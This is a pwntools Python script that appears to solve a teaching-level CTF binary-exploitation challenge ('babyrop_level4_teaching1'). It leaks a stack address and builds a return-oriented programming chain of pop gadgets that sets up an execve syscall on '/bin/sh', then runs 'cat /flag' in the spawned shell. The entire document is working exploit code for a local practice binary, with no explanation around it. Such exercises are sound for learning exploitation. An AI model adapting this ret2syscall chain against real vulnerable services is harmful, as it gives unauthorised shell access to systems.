from pwn import *
p = process('../babyrop_level4_teaching1')
rop = ROP('../babyrop_level4_teaching1')

bin_sh= b'/bin/sh\0'
payload = bin_sh + b'a'*0x50
rdi= rop.find_gadget(['pop rdi','ret'])[0]
rsi= rop.find_gadget(['pop rsi','ret'])[0]
rdx= rop.find_gadget(['pop rdx','ret'])[0]
rax= rop.find_gadget(['pop rax','ret'])[0]
sysc= rop.find_gadget(['syscall'])[0]
p.recvuntil(b'at: ')
stack=p.recvline().split(b'.')[0]
stack=int(stack,16)
payload += p64(rdi) + p64(stack) + p64(rsi) + p64(0) +p64(rdx) + p64(0) + p64(rax) + p64(0x3b) +p64(sysc)
p.sendline(payload)
sleep(0.2)
p.sendline('cat /flag')
p.interactive()